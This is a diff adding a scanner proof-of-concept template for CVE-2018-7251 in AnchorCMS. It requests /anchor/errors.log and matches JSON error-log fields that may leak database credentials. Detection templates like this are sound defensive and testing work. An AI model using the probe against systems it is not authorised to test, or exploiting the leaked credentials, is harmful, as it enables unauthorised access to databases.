@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "检测 AnchorCMS 0.12.3 及更早版本中 /anchor/errors.log 路径是否暴露 MySQL 错误日志，日志中包含 date、message、trace 等 JSON 字段，可泄漏数据库凭据"
+id = "POC-AVE-2018-0193"
+name = "AnchorCMS 0.12.3 error.log 数据库凭据信息泄漏漏洞 PoC"
+severity = "critical"
+tags = ["ave-2018-0193"]
+vuln_id = [
+    "CVE-2018-7251",
+    "AVE-2018-0193",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/anchor/errors.log"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    '"date":',
+    '"message":',
+    '"trace":[',
+]
